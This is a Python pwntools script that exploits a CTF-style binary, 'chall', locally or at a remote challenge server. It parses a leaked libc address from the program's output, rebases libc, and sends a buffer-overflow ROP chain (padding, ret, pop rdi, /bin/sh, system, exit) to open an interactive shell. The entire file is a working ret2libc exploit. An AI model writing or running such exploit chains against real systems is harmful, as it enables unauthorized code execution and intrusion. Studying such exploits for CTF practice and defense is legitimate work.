#!/usr/bin/env python3

import re
from pwn import *

EXE = ELF("./chall")
libc = ELF("./libc-2.27.so")
rop = ROP(libc)

print(EXE.path)
if args.REMOTE:
    r = remote("chall.ehax.tech", 4269)
elif args.GDB:
    r = gdb.debug(EXE.path, "b* 0x400901")
else:
    r = process(EXE.path)


data = r.recvuntil(b"Enter authcode: ")
data = data.replace(b"0x44", b"").replace(b"4F", b"").replace(b"4D", b"")

wctrans_addr = re.search("\s+(0x.+)\n", data.decode())[0].strip()
wctrans_addr = int(wctrans_addr, 16)

log.info("Leaked wctrans address: " + hex(wctrans_addr))

libc.address = wctrans_addr - libc.symbols["wctrans"]

log.success("Libc address: " + hex(libc.address))

binsh = next(libc.search(b"/bin/sh"))
libc_exit = libc.symbols["exit"]
system_addr = libc.symbols["system"]
pop_rdi = libc.address + rop.find_gadget(["pop rdi", "ret"])[0]
ret = libc.address + rop.find_gadget(["ret"])[0]

log.info("Found /bin/sh: " + hex(binsh))
log.info("Found exit: " + hex(libc_exit))
log.info("Found system: " + hex(system_addr))
log.info("Found pop rdi: " + hex(pop_rdi))
log.info("Found ret: " + hex(ret))

payload = (
    b"A" * 168 + p64(ret) + p64(pop_rdi) + p64(binsh) +
    p64(system_addr) + p64(libc_exit)
)
r.sendline(payload)
r.interactive()
